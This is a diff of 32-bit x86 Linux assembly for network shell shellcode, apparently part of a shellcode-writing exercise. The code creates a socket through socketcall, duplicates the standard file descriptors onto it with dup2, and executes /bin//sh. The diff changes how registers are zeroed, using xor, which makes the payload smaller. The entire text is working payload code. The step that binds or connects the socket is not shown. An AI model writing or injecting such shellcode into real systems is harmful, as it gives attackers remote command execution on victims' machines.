@@ -7,18 +7,23 @@ global _start:
   section .text
 
 _start:
+
+  xor eax, eax
+  xor ebx, ebx
+  xor ecx, ecx
+  xor edx, edx
+  xor esi, esi
+  xor edi, edi
+
   ; socketcall (0x66)
   ;   syscall SYS_SOCKET (0x01) - int socket(int domain, int type, int protocol);
-  mov eax, 0xffffffff
-  add eax, 0x1
-  mov ebx, 0xffffffff
-  add ebx, 0x1
+  xor eax, eax
+  xor ebx, ebx
   mov al, 0x66
   mov bl, 0x01
 
   ; pushing arguments to the stack backwards: int protocol (PF_INET, SOCK_STREAM, 0) 
-  mov edx, 0xffffffff
-  add edx, 0x1
+  xor edx, edx
   push edx     ; int domain
 
   push 0x01     ; SOCK_STREAM
@@ -61,13 +66,11 @@ _start:
   ; (0 - stdin, 1 - stdout, 2 - stderr) 
 
   ; let's put all this in a loop
-  mov ecx, 0xffffffff
-  add ecx, 0x1
+  xor ecx, ecx
 
   DUPCOUNT:
   ; int dup2(int oldfd, int newfd);
-  mov eax, 0xffffffff
-  add eax, 0x1
+  xor eax, eax
   mov al, 0x3f
 
   ; ebx (socket descriptor, being copied over from esi saved earlier)
@@ -85,19 +88,16 @@ _start:
 
   ; execve (0x0b) 
   ;   /bin//sh
-  mov eax, 0xffffffff
-  add eax, 0x1
+  xor eax, eax
   ; xor ebx, ebx
   push eax     ; reserve some bytes in the stack to work with
 
   mov al, 0x0b
   push 0x68732f2f   ; //sh
   push 0x6e69622f   ; /bin
-
   mov ebx, esp
 
-  mov ecx, 0xffffffff
-  add ecx, 0x1
+  xor ecx, ecx
 
   ; syscall
   int 0x80
